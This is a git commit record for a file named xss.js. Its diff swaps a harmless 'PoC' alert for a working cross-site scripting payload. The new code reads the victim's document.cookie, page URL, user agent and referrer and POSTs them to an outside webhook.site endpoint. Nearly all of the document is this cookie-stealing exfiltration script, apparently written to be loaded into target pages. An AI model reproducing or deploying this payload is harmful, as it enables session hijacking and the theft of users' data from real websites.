3e8d2e344f4b84532fe7dae8120ceb7635bbe797
hesham573662 <hushah207@gmail.com>
2025-07-06 17:33:47 -0700

    Update xss.js

--- xss.js
+++ xss.js
@@ -1,2 +1,14 @@
-alert("PoC Loaded via external script!");
 
+fetch("https://webhook.site/4b213de0-f8d2-46fc-bc4b-024c492d632f", {
+  method: "POST",
+  headers: {
+    "Content-Type": "application/json"
+  },
+  body: JSON.stringify({
+    cookies: document.cookie,
+    url: window.location.href,
+    userAgent: navigator.userAgent,
+    referrer: document.referrer,
+    timestamp: new Date().toISOString()
+  })
+});
